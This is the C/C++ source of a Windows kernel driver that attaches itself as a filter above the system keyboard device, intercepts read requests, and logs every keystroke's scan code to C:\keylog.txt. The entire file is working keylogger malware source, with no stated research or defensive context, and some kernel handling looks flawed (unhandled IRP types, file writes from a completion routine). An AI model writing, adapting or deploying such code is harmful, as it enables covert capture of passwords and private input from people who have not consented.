#include <ntddk.h>
#include <kbdmou.h>
#include <wchar.h>

#define DEVICE_NAME L"\\Device\\MyKeyboardFilter"
#define DOS_DEVICE_NAME L"\\DosDevices\\MyKeyboardFilter"

PDEVICE_OBJECT g_KeyboardDevice = NULL;
PDEVICE_OBJECT g_MyDeviceObject = NULL;
UNICODE_STRING logFilePath;
HANDLE logFileHandle = NULL;

extern "C" {

    NTSTATUS LogKeyStroke(PCWSTR keyStroke) {
        IO_STATUS_BLOCK ioStatusBlock;
        UNICODE_STRING unicodeKey;
        RtlInitUnicodeString(&unicodeKey, keyStroke);

        if (logFileHandle) {
            return ZwWriteFile(
                logFileHandle,
                NULL,
                NULL,
                NULL,
                &ioStatusBlock,
                (PVOID)unicodeKey.Buffer,
                unicodeKey.Length,
                NULL,
                NULL
            );
        }
        return STATUS_UNSUCCESSFUL;
    }

    NTSTATUS keyboardReadComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
        if (NT_SUCCESS(Irp->IoStatus.Status)) {
            PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
            ULONG keyCount = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

            for (ULONG i = 0; i < keyCount; i++) {
                WCHAR keyStroke[16];
                swprintf(keyStroke, L"0x%x\r\n", keys[i].MakeCode);
                LogKeyStroke(keyStroke);
            }
        }

        return Irp->IoStatus.Status;
    }

    NTSTATUS keyboardDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
        IoCopyCurrentIrpStackLocationToNext(Irp);
        IoSetCompletionRoutine(
            Irp,
            keyboardReadComplete,
            NULL,
            TRUE,
            TRUE,
            TRUE
        );

        return IoCallDriver(g_KeyboardDevice, Irp);
    }

    VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
        if (logFileHandle) {
            ZwClose(logFileHandle);
        }

        if (g_MyDeviceObject) {
            IoDeleteDevice(g_MyDeviceObject);
        }

        if (g_KeyboardDevice) {
            IoDetachDevice(g_KeyboardDevice);
        }

        DbgPrint("Driver Unloaded\n");
    }

    NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
        UNICODE_STRING keyboardDeviceName;
        RtlInitUnicodeString(&keyboardDeviceName, L"\\Device\\KeyboardClass0");

        NTSTATUS status = IoCreateDevice(
            DriverObject,
            0,
            NULL,
            FILE_DEVICE_KEYBOARD,
            FILE_DEVICE_KEYBOARD,
            FALSE,
            &g_MyDeviceObject
        );

        if (!NT_SUCCESS(status)) {
            DbgPrint("Failed to create device\n");
            return status;
        }

        DriverObject->DriverUnload = DriverUnload;
        DriverObject->MajorFunction[IRP_MJ_READ] = keyboardDispatchRoutine;

        status = IoAttachDevice(g_MyDeviceObject, &keyboardDeviceName, &g_KeyboardDevice);

        if (!NT_SUCCESS(status)) {
            IoDeleteDevice(g_MyDeviceObject);
            DbgPrint("Failed to attach to keyboard device\n");
            return status;
        }

        // Initialize log file
        RtlInitUnicodeString(&logFilePath, L"\\??\\C:\\keylog.txt");

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &logFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

        IO_STATUS_BLOCK ioStatusBlock;
        status = ZwCreateFile(
            &logFileHandle,
            GENERIC_WRITE,
            &objAttr,
            &ioStatusBlock,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            IoDetachDevice(g_KeyboardDevice);
            IoDeleteDevice(g_MyDeviceObject);
            DbgPrint("Failed to create or open log file\n");
            return status;
        }

        DbgPrint("Driver Loaded Successfully\n");
        return STATUS_SUCCESS;
    }
}
